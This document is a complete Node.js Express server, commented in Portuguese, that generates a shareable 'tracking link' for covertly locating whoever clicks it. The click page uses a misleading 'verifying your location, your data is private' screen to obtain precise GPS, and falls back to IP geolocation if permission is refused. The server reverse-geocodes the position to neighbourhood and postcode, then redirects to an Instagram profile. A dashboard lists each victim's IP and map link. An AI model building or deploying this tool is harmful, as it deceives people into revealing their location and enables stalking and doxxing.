const express = require('express');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());

const clicks = [];

// Função auxiliar para fazer requisições HTTP/HTTPS
function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    lib.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
}

// Dashboard
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard de Rastreamento</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 15px; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 8px 15px;
          border-radius: 5px;
          display: block;
          margin-top: 10px;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          cursor: pointer;
          font-size: 1em;
          margin-bottom: 20px;
        }
        .btn:hover { background: #5568d3; }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #ffc107;
          padding: 20px;
          margin-bottom: 15px;
          border-radius: 8px;
        }
        .click-item.has-gps {
          border-left-color: #28a745;
          background: #f0fff4;
        }
        .click-time { font-weight: bold; color: #667eea; font-size: 1.1em; margin-bottom: 10px; }
        .click-info { color: #555; margin: 8px 0; line-height: 1.6; }
        .badge {
          display: inline-block;
          padding: 4px 12px;
          border-radius: 12px;
          font-size: 0.85em;
          font-weight: bold;
          margin: 5px 5px 5px 0;
        }
        .badge-gps { background: #28a745; color: white; }
        .badge-ip { background: #ffc107; color: #333; }
        .badge-denied { background: #dc3545; color: white; }
        .map-link {
          color: #667eea;
          text-decoration: none;
          font-weight: bold;
        }
        .map-link:hover { text-decoration: underline; }
        .warning {
          background: #fff3cd;
          border-left: 4px solid #ffc107;
          padding: 15px;
          border-radius: 5px;
          margin-top: 15px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📍 Dashboard de Rastreamento GPS</h1>
          <p>Sistema otimizado para captura de localização precisa via GPS</p>
          <div class="warning">
            <strong>⚠️ Importante:</strong> Este sistema prioriza GPS para máxima precisão. 
            Usuários precisam <strong>permitir a localização</strong> quando solicitado.
          </div>
          <div class="link-box">
            <strong>🔗 Link de Rastreamento:</strong>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()" style="margin-top:10px; padding:8px 20px;">📋 Copiar Link</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">✅ GPS Permitido</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="deniedClicks">0</div>
            <div class="stat-label">❌ GPS Negado</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <h2>Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('✅ Link copiado!');
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.location && c.location.coordenadas);
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            
            const deniedClicks = data.clicks.filter(c => c.gpsDenied);
            document.getElementById('deniedClicks').textContent = deniedClicks.length;
            
            const container = document.getElementById('clicksList');
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique registrado ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR');
              const loc = c.location || c.ipLocation;
              const hasGPS = c.location && c.location.coordenadas;
              const gpsDenied = c.gpsDenied;
              
              let badge = '';
              if (hasGPS) {
                badge = '<span class="badge badge-gps">📍 GPS ATIVO - PRECISÃO MÁXIMA</span>';
              } else if (gpsDenied) {
                badge = '<span class="badge badge-denied">❌ GPS NEGADO - Localização Aproximada</span>';
              } else {
                badge = '<span class="badge badge-ip">🌐 SOMENTE IP - Baixa Precisão</span>';
              }
              
              let locationHTML = '';
              if (loc) {
                locationHTML = \`
                  \${badge}
                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade || 'Não identificada'}</div>
                  <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado || 'Não identificado'}</div>
                  \${loc.bairro && loc.bairro !== 'N/A' && loc.bairro !== 'Não identificado' ? \`<div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>\` : ''}
                  \${loc.pais ? \`<div class="click-info">🌎 <strong>País:</strong> \${loc.pais}</div>\` : ''}
                  \${loc.coordenadas ? \`
                    <div class="click-info">🗺️ <strong>Coordenadas:</strong> \${loc.coordenadas}</div>
                    <div class="click-info"><a href="https://www.google.com/maps?q=\${loc.coordenadas}" target="_blank" class="map-link">🔗 Ver no Google Maps</a></div>
                  \` : ''}
                  \${hasGPS ? '<div class="click-info" style="color:#28a745; font-weight:bold;">✓ Dados 100% precisos via GPS</div>' : ''}
                  \${gpsDenied ? '<div class="click-info" style="color:#dc3545;">⚠️ Usuário negou permissão de localização</div>' : ''}
                \`;
              } else {
                locationHTML = '<div class="click-info" style="color:#ff6b6b;">❌ Localização não disponível</div>';
              }
              
              return \`
                <div class="click-item \${hasGPS ? 'has-gps' : ''}">
                  <div class="click-time">⏰ \${date}</div>
                  <div class="click-info">🌐 <strong>IP:</strong> \${c.ip}</div>
                  \${locationHTML}
                </div>
              \`;
            }).join('');
          } catch (error) {
            console.error('Erro ao carregar:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 5000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento - FORÇA GPS
app.get('/track', async (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    location: null,
    ipLocation: null,
    gpsDenied: false
  };
  
  clicks.push(clickData);
  console.log('✅ Novo clique ID:', clickData.id, 'IP:', clickData.ip);
  
  // NÃO busca IP automaticamente - só se GPS falhar
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Verificando localização...</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: Arial, sans-serif;
        }
        .container {
          text-align: center;
          background: white;
          padding: 40px;
          border-radius: 20px;
          box-shadow: 0 10px 50px rgba(0,0,0,0.3);
          max-width: 400px;
        }
        .loader {
          border: 5px solid #f3f3f3;
          border-top: 5px solid #667eea;
          border-radius: 50%;
          width: 60px;
          height: 60px;
          animation: spin 1s linear infinite;
          margin: 20px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        h2 { color: #667eea; margin-bottom: 10px; }
        p { color: #666; line-height: 1.6; }
        .important {
          background: #fff3cd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          font-size: 0.9em;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>📍 Verificando sua localização...</h2>
        <div class="loader"></div>
        <p><strong>Por favor, permita o acesso à sua localização</strong> quando o navegador solicitar.</p>
        <div class="important">
          ℹ️ Isso é necessário para melhor precisão. Seus dados são privados.
        </div>
      </div>
      
      <script>
        const clickId = ${clickData.id};
        let redirected = false;
        
        function redirect() {
          if (!redirected) {
            redirected = true;
            window.location.href = 'https://www.instagram.com/andre.osantos12/';
          }
        }
        
        // Timeout de segurança - redireciona após 15 segundos
        setTimeout(redirect, 15000);
        
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              try {
                console.log('GPS obtido:', pos.coords.latitude, pos.coords.longitude);
                
                await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    clickId: clickId,
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                  })
                });
                
                console.log('GPS salvo com sucesso');
              } catch (e) {
                console.error('Erro ao salvar GPS:', e);
              }
              
              // Aguarda 2 segundos para salvar antes de redirecionar
              setTimeout(redirect, 2000);
            },
            async (error) => {
              console.log('GPS negado ou erro:', error.message);
              
              // Marca que GPS foi negado
              try {
                await fetch('/api/gps-denied', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({ clickId: clickId })
                });
              } catch (e) {}
              
              // Redireciona imediatamente se negar
              setTimeout(redirect, 500);
            },
            { 
              enableHighAccuracy: true, 
              timeout: 10000,
              maximumAge: 0 
            }
          );
        } else {
          console.log('Navegador não suporta GPS');
          redirect();
        }
      </script>
    </body>
    </html>
  `);
});

// Endpoint quando GPS é negado
app.post('/api/gps-denied', async (req, res) => {
  try {
    const { clickId } = req.body;
    const click = clicks.find(c => c.id === clickId);
    
    if (click) {
      click.gpsDenied = true;
      console.log('  ❌ GPS negado para click', clickId);
      
      // Agora tenta localização por IP como fallback
      const ipClean = click.ip.replace('::ffff:', '').replace('::1', '').trim();
      let finalIP = ipClean;
      
      if (ipClean === '127.0.0.1' || ipClean === '' || ipClean.startsWith('192.168') || ipClean.startsWith('10.')) {
        try {
          const ipData = await fetchJSON('https://api.ipify.org?format=json');
          finalIP = ipData.ip;
        } catch (e) {}
      }
      
      try {
        const ipData = await fetchJSON(`http://ip-api.com/json/${finalIP}?lang=pt&fields=status,country,regionName,city,lat,lon`);
        
        if (ipData.status === 'success') {
          click.ipLocation = {
            cidade: ipData.city || 'Não identificada',
            estado: ipData.regionName || 'Não identificado',
            bairro: 'N/A',
            pais: ipData.country || 'Brasil',
            coordenadas: null
          };
          console.log('  ⚠ Localização por IP (baixa precisão):', ipData.city);
        }
      } catch (error) {
        console.log('  ✗ Falha na localização por IP');
      }
    }
    
    res.json({ success: true });
  } catch (error) {
    res.json({ success: false });
  }
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false });
    }
    
    console.log('  ✓ GPS recebido:', lat, lng, 'Precisão:', accuracy, 'm');
    
    // Busca endereço via Nominatim
    try {
      const data = await fetchJSON(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1&accept-language=pt-BR`
      );
      
      if (data && data.address) {
        const addr = data.address;
        
        click.location = {
          cidade: addr.city || addr.town || addr.village || addr.municipality || 'Não identificada',
          estado: addr.state || 'Não identificado',
          bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || 'N/A',
          pais: addr.country || 'Brasil',
          cep: addr.postcode || 'N/A',
          coordenadas: `${lat}, ${lng}`
        };
        
        console.log('  ✅ GPS PRECISO:', click.location.cidade, '-', click.location.estado, '/', click.location.bairro);
      }
    } catch (error) {
      console.error('  ✗ Erro ao buscar endereço GPS:', error.message);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro:', error);
    res.json({ success: false });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: clicks.slice().reverse()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    uptime: process.uptime(),
    clicks: clicks.length
  });
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('==========================================');
  console.log('✅ SERVIDOR GPS-FIRST ONLINE!');
  console.log('==========================================');
  console.log('Porta:', PORT);
  console.log('Modo: PRIORIDADE GPS');
  console.log('');
  console.log('📍 Sistema otimizado para GPS');
  console.log('⚠️  IP usado apenas se GPS for negado');
  console.log('==========================================');
  console.log('');
});
